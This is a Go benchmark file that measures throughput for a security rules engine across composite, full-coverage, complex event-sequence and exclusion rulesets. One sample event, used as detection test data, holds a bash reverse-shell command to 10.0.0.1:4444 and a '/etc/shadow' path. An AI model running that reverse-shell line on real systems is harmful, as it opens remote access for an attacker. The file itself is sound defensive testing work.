package rules_engine

// TPS (events per second) benchmarks. Rulesets and sample events live under testdata/;
// see loadBuiltRulesetFromTestdata / loadEventsFromTestdataJSON in engine_testdata_test.go.
//
// Requires CGO + librure. From repo root: make test-rules-engine
//
// ~5 minute sustained run (example if librure is in repo lib/):
//
//	cd src && CGO_ENABLED=1 CGO_LDFLAGS="-L../lib -lrure -Wl,-rpath,$$PWD/../lib" \
//	  go test ./rules_engine -bench=BenchmarkRulesEngineTPS -benchtime=5m -count=1 -benchmem
//
// Shorter smoke:
//
//	go test ./rules_engine -bench=BenchmarkRulesEngineTPS -benchmem
//
// Parallel:
//
//	go test ./rules_engine -bench=BenchmarkRulesEngineTPS/Parallel -benchtime=5m -cpu=1,8 -count=1

import "testing"

func reportTPS(b *testing.B) {
	b.Helper()
	sec := b.Elapsed().Seconds()
	if sec <= 0 {
		return
	}
	b.ReportMetric(float64(b.N)/sec, "evt/s")
}

func BenchmarkRulesEngineTPS(b *testing.B) {
	events := loadEventsFromTestdataJSON(b, "events/tps_composite_events.json")

	b.Run("Composite_FixedSingleEvent", func(b *testing.B) {
		rs := loadBuiltRulesetFromTestdata(b, "rulesets/tps_composite.xml")
		data := events[0]
		rs.EngineCheck(data)
		b.ReportAllocs()
		b.ResetTimer()
		for b.Loop() {
			_ = rs.EngineCheck(data)
		}
		reportTPS(b)
	})

	b.Run("Composite_RotateFixedBatch", func(b *testing.B) {
		rs := loadBuiltRulesetFromTestdata(b, "rulesets/tps_composite.xml")
		for _, ev := range events {
			rs.EngineCheck(ev)
		}
		n := len(events)
		b.ReportAllocs()
		b.ResetTimer()
		i := 0
		for b.Loop() {
			_ = rs.EngineCheck(events[i%n])
			i++
		}
		reportTPS(b)
	})

	b.Run("Composite_ClonePerEvent", func(b *testing.B) {
		rs := loadBuiltRulesetFromTestdata(b, "rulesets/tps_composite.xml")
		base := events[2]
		rs.EngineCheck(cloneEventForReplay(base))
		b.ReportAllocs()
		b.ResetTimer()
		for b.Loop() {
			_ = rs.EngineCheck(cloneEventForReplay(base))
		}
		reportTPS(b)
	})

	b.Run("Parallel_Composite_FixedSingleEvent", func(b *testing.B) {
		rs := loadBuiltRulesetFromTestdata(b, "rulesets/tps_composite.xml")
		data := events[1]
		rs.EngineCheck(data)
		b.ReportAllocs()
		b.ResetTimer()
		b.RunParallel(func(pb *testing.PB) {
			for pb.Next() {
				_ = rs.EngineCheck(data)
			}
		})
		reportTPS(b)
	})
}

// BenchmarkRulesEngineFullCoverage measures TPS against a 15-rule ruleset that exercises
// every non-Redis operator type in a single pass:
//
//	EQU / NEQ / INCL(OR+AND delimiter) / EXCL / START / END
//	NCS_EQU / NCS_INCL / NOTNULL / ISNULL / nested-field / dynamic-ref (_$field)
//	GT / LT / GTE / LTE / REGEX
//	checklist with (AND OR NOT) compound condition
//	iterator ANY + ALL
//	threshold COUNT / SUM / CLASSIFY  (all local_cache – never fire at bench ceiling)
//	append(static+dynamic) / modify / del
//	plugin check (isPrivateIP) / plugin modify (hashMD5)
//	sequence / CEP two-step login→access  (local_cache)
//
// The inline sampleEvent is the "golden path" that hits all 15 rules.
// Thresholds and sequence accumulate state but are set high enough not to emit alerts
// within a single bench run.
//
// Run (from ./src):
//
//	go test ./rules_engine -bench=BenchmarkRulesEngineFullCoverage -benchmem -count=3
//
// Sustained 5-minute run:
//
//	cd src && CGO_ENABLED=1 CGO_LDFLAGS="-L../lib -lrure -Wl,-rpath,$$PWD/../lib" \
//	  go test ./rules_engine -bench=BenchmarkRulesEngineFullCoverage -benchtime=5m -count=1 -benchmem
func BenchmarkRulesEngineFullCoverage(b *testing.B) {
	// sampleEvent hits every rule in rulesets/full_coverage.xml.
	// user_agent is intentionally absent so ISNULL matches.
	// src == dst so the dynamic-ref EQU check passes.
	// tags contains "critical" so iterator ANY fires.
	// all item.v > 0 so iterator ALL fires.
	sampleEvent := map[string]interface{}{
		// ── rules r01–r15 ────────────────────────────────────────────────────
		"channel":    "security",
		"dropped":    "false",
		"cmd":        "bash -i >&/dev/tcp/10.0.0.1/4444 0>&1",
		"referer":    "https://example.com/index.html",
		"path":       "/etc/shadow",
		"filename":   "sshd.conf",
		"action":     "LOGIN",
		"message":    "ALERT: suspicious outbound connection",
		"event_id":   "ev-001",
		// user_agent absent → ISNULL matches
		"meta":       map[string]interface{}{"env": "production"},
		"src":        "10.0.0.1",
		"dst":        "10.0.0.1", // == src → dynamic-ref EQU passes
		"url":        "/api/v1/admin/users",
		"risk_score": 85,
		"bytes":      4096,
		"actor":      "alice",
		"port":       4444,
		"event_type": "login",
		"_drop_me":   "scratch",
		"tags":       []interface{}{"audit", "critical", "network"},
		"items": []interface{}{
			map[string]interface{}{"v": 2},
			map[string]interface{}{"v": 7},
		},
		// ── rule r16: negation + NCS-negation variants ────────────────────────
		"user_type":    "guest",            // NSTART "admin"   → guest !startsWith admin
		"extension":    ".txt",             // NEND   ".exe"    → .txt  !endsWith   .exe
		"outcome":      "FAILURE",          // NCS_NEQ "success"→ FAILURE ≠ success
		"detail":       "normal ops",       // NCS_NI  "alert"  → no "alert" substring
		"method":       "GET",              // NCS_START "ge"   → GET startsWith ge
		"content_type": "application/json", // NCS_END "json"   → ends with json
		"host":         "internal.corp",    // NCS_NSTART "external" → !startsWith external
		"accept":       "text/html",        // NCS_NEND "xml"   → !endsWith xml
	}

	// SingleEvent_Clone: clone the event on every iteration so that append/modify/del
	// in rule r12_xform always see a fresh copy. Most realistic for measuring per-event cost.
	b.Run("SingleEvent_Clone", func(b *testing.B) {
		rs := loadBuiltRulesetFromTestdata(b, "rulesets/full_coverage.xml")
		rs.EngineCheck(cloneEventForReplay(sampleEvent)) // warmup: compile regex cache, seed threshold/CEP state
		b.ReportAllocs()
		b.ResetTimer()
		for b.Loop() {
			_ = rs.EngineCheck(cloneEventForReplay(sampleEvent))
		}
		reportTPS(b)
	})

	// RotateBatch: cycle through the 8-event batch from testdata, cloning each.
	// Exercises both hit and miss paths across different actors / risk scores / cmd strings.
	b.Run("RotateBatch", func(b *testing.B) {
		rs := loadBuiltRulesetFromTestdata(b, "rulesets/full_coverage.xml")
		batch := loadEventsFromTestdataJSON(b, "events/full_coverage_events.json")
		n := len(batch)
		for _, ev := range batch { // warmup
			rs.EngineCheck(cloneEventForReplay(ev))
		}
		b.ReportAllocs()
		b.ResetTimer()
		i := 0
		for b.Loop() {
			_ = rs.EngineCheck(cloneEventForReplay(batch[i%n]))
			i++
		}
		reportTPS(b)
	})

	// Parallel: goroutine-per-core, each clones its own copy.
	b.Run("Parallel", func(b *testing.B) {
		rs := loadBuiltRulesetFromTestdata(b, "rulesets/full_coverage.xml")
		rs.EngineCheck(cloneEventForReplay(sampleEvent)) // warmup
		b.ReportAllocs()
		b.ResetTimer()
		b.RunParallel(func(pb *testing.PB) {
			for pb.Next() {
				_ = rs.EngineCheck(cloneEventForReplay(sampleEvent))
			}
		})
		reportTPS(b)
	})
}

// BenchmarkRulesEngineCEPComplex measures TPS for the five complex CEP condition
// patterns not covered by the basic two-step sequence in BenchmarkRulesEngineFullCoverage:
//
//	c01  three-step sequence   recon -> exploit -> exfil
//	c02  OR at a stage         login -> (exec or script)
//	c03  OR then next step     login -> (lateral or priv_esc) -> exfil
//	c04  simple absence        login -> !mfa
//	c05  absence chain         login -> !mfa -> access -> !logout
//
// Events are loaded from testdata/events/full_coverage_cep_events.jsonl which
// contains ordered events designed to complete or partially advance each pattern.
func BenchmarkRulesEngineCEPComplex(b *testing.B) {
	b.Run("RotateBatch", func(b *testing.B) {
		rs := loadBuiltRulesetFromTestdata(b, "rulesets/full_coverage_cep.xml")
		events := loadEventsFromTestdataJSONL(b, "events/full_coverage_cep_events.jsonl")
		n := len(events)
		for _, ev := range events { // warmup: seed CEP state
			rs.EngineCheck(cloneEventForReplay(ev))
		}
		b.ReportAllocs()
		b.ResetTimer()
		i := 0
		for b.Loop() {
			_ = rs.EngineCheck(cloneEventForReplay(events[i%n]))
			i++
		}
		reportTPS(b)
	})

	b.Run("Parallel", func(b *testing.B) {
		rs := loadBuiltRulesetFromTestdata(b, "rulesets/full_coverage_cep.xml")
		events := loadEventsFromTestdataJSONL(b, "events/full_coverage_cep_events.jsonl")
		n := len(events)
		for _, ev := range events { // warmup
			rs.EngineCheck(cloneEventForReplay(ev))
		}
		b.ReportAllocs()
		b.ResetTimer()
		b.RunParallel(func(pb *testing.PB) {
			i := 0
			for pb.Next() {
				_ = rs.EngineCheck(cloneEventForReplay(events[i%n]))
				i++
			}
		})
		reportTPS(b)
	})
}

// BenchmarkRulesEngineExclude measures TPS for EXCLUDE-type rulesets, which filter
// events rather than detect them.  Three sub-cases:
//
//	DropEvent    — event matches rule ex1 (first rule, early exit)
//	PassThrough  — no rule matches; event passes unchanged
//	RotateBatch  — mix of excluded and pass-through events
func BenchmarkRulesEngineExclude(b *testing.B) {
	// health-check ping: matches ex1 immediately → dropped after first rule
	dropEvent := map[string]interface{}{
		"channel": "health",
		"path":    "/healthz",
		"risk_score": 0,
	}
	// security event: no exclude rule matches → passes through all three rules
	passEvent := map[string]interface{}{
		"channel":    "security",
		"path":       "/api/v1/admin",
		"risk_score": 50,
		"actor":      "alice",
	}

	b.Run("DropEvent", func(b *testing.B) {
		rs := loadBuiltRulesetFromTestdata(b, "rulesets/full_coverage_exclude.xml")
		rs.EngineCheck(dropEvent)
		b.ReportAllocs()
		b.ResetTimer()
		for b.Loop() {
			_ = rs.EngineCheck(dropEvent)
		}
		reportTPS(b)
	})

	b.Run("PassThrough", func(b *testing.B) {
		rs := loadBuiltRulesetFromTestdata(b, "rulesets/full_coverage_exclude.xml")
		rs.EngineCheck(passEvent)
		b.ReportAllocs()
		b.ResetTimer()
		for b.Loop() {
			_ = rs.EngineCheck(passEvent)
		}
		reportTPS(b)
	})

	b.Run("RotateBatch", func(b *testing.B) {
		rs := loadBuiltRulesetFromTestdata(b, "rulesets/full_coverage_exclude.xml")
		batch := loadEventsFromTestdataJSON(b, "events/full_coverage_exclude_events.json")
		n := len(batch)
		for _, ev := range batch { // warmup
			rs.EngineCheck(ev)
		}
		b.ReportAllocs()
		b.ResetTimer()
		i := 0
		for b.Loop() {
			_ = rs.EngineCheck(batch[i%n])
			i++
		}
		reportTPS(b)
	})
}
